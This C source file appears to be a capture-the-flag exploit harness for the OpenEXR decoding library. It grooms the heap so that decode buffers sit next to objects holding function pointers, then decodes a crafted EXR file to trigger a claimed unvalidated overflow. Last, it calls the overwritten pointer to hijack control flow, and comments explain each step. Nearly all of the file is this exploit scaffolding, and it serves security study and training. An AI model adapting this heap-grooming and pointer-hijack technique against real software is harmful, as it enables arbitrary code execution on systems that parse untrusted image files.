
#include <openexr_context.h>
#include <openexr_part.h>
#include <openexr_decode.h>
#include <stdio.h>
#include <stdlib.h>

#include <string.h>

#define DECODE_BUF_SIZE 256

void error_handler(exr_const_context_t f, int code, const char* msg) {
    fprintf(stderr, "EXR Error (%d): %s\n", code, msg);
}



// RESOURCE: Target Function
// This is the function we want to execute. In a real attack, this could be shellcode or a ROP chain.
// Here, we simply want to redirect control flow to this address.
void flag1() {
    printf("\n\n***************************************************\n");
    printf("*                                                 *\n");
    printf("*  [PWNED] CONTROL FLOW HIJACKED!                 *\n");
    printf("*  [FLAG]  CTF{H3ap_0verfl0w_2_C0d3_Ex3c_Succ3ss} *\n");
    printf("*                                                 *\n");
    printf("***************************************************\n\n");
    exit(0);
}

void cleanup() {
    printf("Safe cleanup executed. No exploit.\n");
}

// RESOURCE: Victim Object
// This structure simulates a sensitive object on the heap.
// It contains a function pointer ('callback') which is a prime target for overwriting.
typedef struct {
    char padding[16];
    void (*callback)();
    // Padding to ensure size matches the decode buffer (heap grooming stability)
    char extra_padding[DECODE_BUF_SIZE - 24]; 
} UnsuspectingVictim;

int main(int argc, char** argv) {
    if (argc < 2) {
        printf("Usage: %s <exr_file>\n", argv[0]);
        return 1;
    }
    
    char addr_buf[64];
    snprintf(addr_buf, sizeof(addr_buf), "%p", &flag1);
    setenv("FLAG_ADDR", addr_buf, 1);
    printf("Target Function (flag1) Address: %s\n", addr_buf);
    
    exr_context_t f;
    exr_context_initializer_t cinit = EXR_DEFAULT_CONTEXT_INITIALIZER;
    cinit.error_handler_fn = error_handler;
    
    exr_result_t rv = exr_start_read(&f, argv[1], &cinit);
    if (rv != EXR_ERR_SUCCESS) {
        printf("Failed to open file\n");
        return 1;
    }
    
    int part = 0;
    exr_attr_box2i_t datawin;
    if (exr_get_data_window(f, part, &datawin) != EXR_ERR_SUCCESS) {
        printf("Failed to get data window\n");
        return 1;
    }
    
    int width = datawin.max.x - datawin.min.x + 1;
    int height = datawin.max.y - datawin.min.y + 1;
    
    int lines_per_chunk;
    if (exr_get_scanlines_per_chunk(f, part, &lines_per_chunk) != EXR_ERR_SUCCESS) {
        lines_per_chunk = 1; 
    }
    
    printf("Processing image %dx%d, lines per chunk: %d\n", width, height, lines_per_chunk);

    exr_decode_pipeline_t decoder = EXR_DECODE_PIPELINE_INITIALIZER;
    
    for (int y = datawin.min.y; y <= datawin.max.y; y += lines_per_chunk) {
        exr_chunk_info_t cinfo = {0};
        rv = exr_read_scanline_chunk_info(f, part, y, &cinfo);
        if (rv != EXR_ERR_SUCCESS) {
            printf("Failed to get chunk info for y=%d\n", y);
            continue;
        }
        
        rv = exr_decoding_initialize(f, part, &cinfo, &decoder);
        if (rv != EXR_ERR_SUCCESS) {
            printf("Failed to init decoding for y=%d\n", y);
            continue;
        }
        
        rv = exr_decoding_choose_default_routines(f, part, &decoder);
        if (rv != EXR_ERR_SUCCESS) {
            printf("Failed to choose routines for y=%d\n", y);
            continue;
        }
        
        // STEP 1: HEAP GROOMING
        // We arrange the heap so that the 'vulnerable buffer' and the 'victim object' are adjacent.
        // [ DecodeBuffer (256 bytes) ] [ Victim Object (256 bytes) ]
        // By allocating them sequentially with the same size, we maximize the chance they are placed together.

        // We need to keep pointers to free them / or keep them alive
        void* chunks_mem[10];

        for (int c = 0; c < decoder.channel_count; c++) {
             // 1. Allocate the buffer that will be overflowed
             decoder.channels[c].decode_to_ptr = malloc(DECODE_BUF_SIZE);
             
             // 2. Allocate the victim object immediately after
             UnsuspectingVictim* victim = (UnsuspectingVictim*)malloc(DECODE_BUF_SIZE);
             victim->callback = cleanup; // Initialize to safe function
             
             printf("Grooming values:\n");
             printf("  Buffer: %p\n", decoder.channels[c].decode_to_ptr);
             printf("  Victim: %p\n", victim);
             long diff = (char*)victim - (char*)decoder.channels[c].decode_to_ptr;
             printf("  Diff:   %ld bytes\n", diff);

             // Save for access
             chunks_mem[c] = (void*)victim; 
             
             decoder.channels[c].user_pixel_stride = 4; 
             decoder.channels[c].user_line_stride = width * 4; 
             decoder.channels[c].user_bytes_per_element = 4;
        }

        // STEP 2: TRIGGER VULNERABILITY
        // exr_decoding_run() processes the malicious file.
        // The library reads the huge 'sample count', fails to validate it, and writes pass the end of 'decode_to_ptr'.
        // This overwrites the adjacent 'victim' object, specifically replacing 'victim->callback' with the address of 'flag1'.
        printf("Running decode for y=%d... (Expecting overwrite)\n", y);
        rv = exr_decoding_run(f, part, &decoder);
        
        // STEP 3: HIJACK EXECUTION
        // We verify the corruption and call the function pointer.
        // Instead of calling 'cleanup()', it calls 'flag1()'.
        for (int c = 0; c < decoder.channel_count; c++) {
             UnsuspectingVictim* v = (UnsuspectingVictim*)chunks_mem[c];
             printf("Checking victim %d callback at %p...\n", c, v->callback);
             
             // CALL THE CORRUPTED POINTER
             v->callback(); 
             
             free(v);
        }
        
        // Cleanup this chunk's buffers
        for (int c = 0; c < decoder.channel_count; c++) {
            free(decoder.channels[c].decode_to_ptr);
        }
        exr_decoding_destroy(f, &decoder);
    }
    
    exr_finish(&f);
    printf("Finished processing.\n");
    return 0;
}
